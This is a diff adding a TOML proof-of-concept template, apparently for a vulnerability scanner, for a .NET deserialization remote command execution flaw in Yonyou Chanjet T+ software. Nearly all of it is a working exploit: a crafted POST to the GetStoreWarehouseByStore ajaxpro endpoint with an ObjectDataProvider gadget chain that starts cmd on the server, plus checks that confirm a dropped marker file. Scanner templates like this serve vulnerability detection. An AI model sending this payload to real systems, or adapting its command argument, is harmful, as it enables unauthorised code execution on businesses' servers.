@@ -1,0 +1,59 @@
+[info]
+id = "POC-AVE-2026-00069"
+name = "用友畅捷通T+ GetStoreWarehouseByStore .NET反序列化RCE PoC"
+author = "AVE"
+severity = "critical"
+tags = ["rce", "deserialization", "dotnet", "chanjet", "tplus"]
+description = "用友畅捷通T+ GetStoreWarehouseByStore接口存在.NET反序列化漏洞，通过向App_Code.ashx发送恶意序列化payload可实现远程命令执行"
+vuln_id = ["CNVD-2023-48562", "AVE-2026-00069"]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore"
+headers = {"X-Ajaxpro-Method" = "GetStoreWarehouseByStore", "Content-Type" = "application/x-www-form-urlencoded"}
+body = """
+{
+  "storeID":{
+    "__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+    "MethodName":"Start",
+    "ObjectInstance":{
+      "__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+      "StartInfo":{
+        "__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+        "FileName":"cmd",
+        "Arguments":"/c echo ave_test_marker > tplus_ave_poc.txt"
+      }
+    }
+  }
+}
+"""
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200, 500]
+expect = true
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["actorId或archivesId不能为空", "Type", "System.ArgumentException", "Object reference not set to an instance of an object", "System.NullReferenceException"]
+condition = "or"
+expect = true
+
+[[poc.requests]]
+method = "GET"
+path = "/tplus/tplus_ave_poc.txt"
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["ave_test_marker"]
+expect = true
